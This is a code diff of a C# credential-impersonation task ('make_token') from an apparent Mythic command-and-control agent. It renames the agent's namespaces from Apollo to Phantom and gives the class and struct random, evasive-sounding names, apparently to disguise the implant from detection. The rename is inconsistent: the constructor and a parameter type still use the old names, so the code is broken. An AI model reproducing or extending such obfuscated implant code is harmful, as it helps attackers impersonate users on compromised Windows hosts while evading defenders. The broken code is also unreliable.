@@ -6,37 +6,37 @@
 
 #if MAKE_TOKEN
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class make_token : Tasking
+    public class AdvancedBridge5586 : Tasking
     {
         [DataContract]
-        internal struct MakeTokenParameters
+        internal struct StealthEngineF43A
         {
             [DataMember(Name = "credential")]
             public Credential Credential;
             [DataMember(Name = "netOnly")]
             public bool NetOnly;
         }
-        public make_token(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public make_token(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
         public override void Start()
         {
             MythicTaskResponse resp;
             MakeTokenParameters parameters = _jsonSerializer.Deserialize<MakeTokenParameters>(_data.Parameters);
-            if (string.IsNullOrEmpty(parameters.Credential.Account))
+            if (ValidationHelper.IsStringEmpty(parameters.Credential.Account))
             {
                 resp = CreateTaskResponse("Account name is empty.", true, "error");
             }
-            else if (string.IsNullOrEmpty(parameters.Credential.CredentialMaterial))
+            else if (ValidationHelper.IsStringEmpty(parameters.Credential.CredentialMaterial))
             {
                 resp = CreateTaskResponse("Password is empty.", true, "error");
             }
@@ -46,7 +46,7 @@ namespace Tasks
             }
             else
             {
-                ApolloLogonInformation info = new ApolloLogonInformation(
+                PhantomLogonInformation info = new PhantomLogonInformation(
                     parameters.Credential.Account,
                     parameters.Credential.CredentialMaterial,
                     parameters.Credential.Realm,
